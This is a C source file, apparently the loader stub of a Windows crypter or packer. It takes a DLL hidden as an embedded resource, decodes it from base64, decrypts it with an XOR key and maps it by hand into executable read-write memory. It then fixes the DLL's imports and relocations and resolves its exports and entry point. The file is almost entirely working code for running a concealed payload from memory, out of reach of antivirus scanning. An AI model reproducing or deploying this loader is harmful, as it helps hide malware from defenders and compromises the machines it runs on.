#include <Windows.h>

#include "Headers/tools.h"
#include "Headers/loader.h"
#include "Headers/resource.h"


BOOL fixIAT(LPVOID dll, PIMAGE_NT_HEADERS ntHeader) {

	IMAGE_DATA_DIRECTORY importDirectory = {};
	PIMAGE_IMPORT_DESCRIPTOR importTable = {};

	importDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importTable = (PIMAGE_IMPORT_DESCRIPTOR)((CHAR *)dll + importDirectory.VirtualAddress);
	while (importTable->Name) { 	// I dont check importDirectory.size because in this case I know it has entries
		HMODULE hModule = LoadLibrary((LPCSTR)((CHAR *)dll + importTable->Name));
		PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((CHAR *)dll + importTable->OriginalFirstThunk);
		DWORD firstThunk = (DWORD)((CHAR *)dll + importTable->FirstThunk);
		while (thunk->u1.AddressOfData) {
			LPCSTR procName = (LPCSTR)((PIMAGE_IMPORT_BY_NAME)((CHAR *)dll + thunk->u1.Function))->Name;
			*(FARPROC *)firstThunk = GetProcAddress(hModule, procName);
			thunk = (PIMAGE_THUNK_DATA)((CHAR*)thunk + sizeof(DWORD));
			firstThunk += sizeof(DWORD);
		}
		importTable = (PIMAGE_IMPORT_DESCRIPTOR)((CHAR *)importTable + sizeof(IMAGE_IMPORT_DESCRIPTOR));
	}
	return TRUE;
}

BOOL fixReloc(LPVOID dll, PIMAGE_NT_HEADERS ntHeader) {

	IMAGE_DATA_DIRECTORY relocDirectory = {};
	PIMAGE_BASE_RELOCATION baseRelocation = {};
	DWORD imageBase = ntHeader->OptionalHeader.ImageBase;

	DWORD delta = (DWORD)dll - imageBase;

	relocDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	baseRelocation = (PIMAGE_BASE_RELOCATION)((CHAR *)dll + relocDirectory.VirtualAddress);

	while (baseRelocation->SizeOfBlock) {
		DWORD numberOfRelocs = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		DWORD rvaPage = (DWORD)((CHAR *)dll + baseRelocation->VirtualAddress);

		for (unsigned int i = 0; i < numberOfRelocs; i++) {
			WORD relocEntry = *(WORD *)((CHAR *)baseRelocation + sizeof(IMAGE_BASE_RELOCATION) + (i*sizeof(WORD)));
			WORD type = (relocEntry>>12) & 0xF;
			DWORD offset = rvaPage + (relocEntry & 0xFFF);
			
			switch (type) {
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*(DWORD *)offset += delta;
				break;
			default:
				return FALSE;
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((CHAR *)baseRelocation + baseRelocation->SizeOfBlock);
	}

	return TRUE;
}

LPVOID LoadPE(LPVOID lpDll) {

	LPVOID dll = NULL;
	PIMAGE_DOS_HEADER dosHeader = {};
	PIMAGE_NT_HEADERS ntHeader = {};
	PIMAGE_SECTION_HEADER section = {};


	dosHeader = (PIMAGE_DOS_HEADER) lpDll;
	ntHeader = (PIMAGE_NT_HEADERS)((DWORD)lpDll + dosHeader->e_lfanew);

	dll = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	DWORD sizeHeaders = ntHeader->OptionalHeader.SizeOfHeaders;
	DWORD sectionLocation = (DWORD)ntHeader + sizeof(IMAGE_OS2_SIGNATURE) + sizeof(IMAGE_FILE_HEADER) + (DWORD)ntHeader->FileHeader.SizeOfOptionalHeader;
	DWORD sectionAddr = (DWORD)lpDll + ((PIMAGE_SECTION_HEADER)sectionLocation)->PointerToRawData;

	memcpy_s(dll, sizeHeaders, lpDll, sizeHeaders);

	for (unsigned int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
		section = (PIMAGE_SECTION_HEADER)sectionLocation;
		DWORD sectionSize = section->SizeOfRawData;
		if (section->Characteristics == (IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
			memset((CHAR *)dll + section->VirtualAddress, 0x0, sectionSize);
		}
		else {
			memcpy_s((CHAR *)dll + section->VirtualAddress, sectionSize, (LPVOID)sectionAddr, sectionSize);
			sectionAddr += sectionSize;
		}
		sectionLocation += sizeof(IMAGE_SECTION_HEADER);
	}
	
	fixIAT(dll, ntHeader);
	if ((DWORD)dll != ntHeader->OptionalHeader.ImageBase) {
		fixReloc(dll, ntHeader);
	}

	return dll;
}

LPVOID GetExportedFunction(LPVOID moduleBase, LPCSTR funcName) {

	WORD ordinal = NULL;
	LPVOID exportAddr = NULL;
	PIMAGE_NT_HEADERS ntHeader = {};
	PIMAGE_DOS_HEADER dosHeader = {};
	PIMAGE_EXPORT_DIRECTORY exports = {};
	IMAGE_DATA_DIRECTORY exportDirectory = {};

	dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
	ntHeader = (PIMAGE_NT_HEADERS)((DWORD)moduleBase + dosHeader->e_lfanew);

	exportDirectory = (IMAGE_DATA_DIRECTORY)ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	exports = (PIMAGE_EXPORT_DIRECTORY)((CHAR *)moduleBase + exportDirectory.VirtualAddress);

	for (unsigned int i = 0; i < exports->NumberOfNames; i++) {
		DWORD exportNameRva = *(DWORD *)((CHAR *)moduleBase + exports->AddressOfNames + (sizeof(DWORD)*i));
		LPCSTR exportName = (LPCSTR)((CHAR *)moduleBase + exportNameRva);
		if (strcmp(exportName, funcName) == 0) {
			// Hack cause the name array is not parallel to the other two arrays (would be nice to have an struct with the three instead three separate arrays)
			ordinal = *(WORD *)((CHAR *)moduleBase + exports->AddressOfNameOrdinals + (sizeof(WORD)*i)); // not adding the base only for the hack, so its not the true ordinal
			DWORD rvaFunction = *(DWORD *)((CHAR *)moduleBase + exports->AddressOfFunctions + (sizeof(DWORD)*ordinal));
			exportAddr = (CHAR *)moduleBase + rvaFunction;
			break;
		}
	}

	return exportAddr;
}

LPVOID GetEntryPoint(HMODULE hModule) {

	LPVOID entryPoint = NULL;
	PIMAGE_NT_HEADERS ntHeader = {};
	PIMAGE_DOS_HEADER dosHeader = {};

	dosHeader = (PIMAGE_DOS_HEADER)hModule;
	ntHeader = (PIMAGE_NT_HEADERS)((DWORD)hModule + dosHeader->e_lfanew);

	entryPoint = (CHAR*)hModule + ntHeader->OptionalHeader.AddressOfEntryPoint;

	return entryPoint;
}

HMODULE WriteDllIntoProcess(HMODULE hModule) {

	BYTE * decAddr = NULL;
	HMODULE lDll = NULL;
	resStruc resource = {};
	decryptedDataStruc decryptedDll = {};

	resource = GetResource(hModule, IDR_RCDATA1);
	decAddr = DecryptBase64(&decryptedDll, resource.resAddress, resource.resSize);
	decryptedDll.decryptedData = XorBytes(decAddr, decryptedDll.sizeData, XOR_DLL_KEY);

	lDll = (HMODULE) LoadPE(decryptedDll.decryptedData);

	HeapFree(GetProcessHeap(), 0, decAddr);
	HeapFree(GetProcessHeap(), 0, decryptedDll.decryptedData);

	return lDll;
}
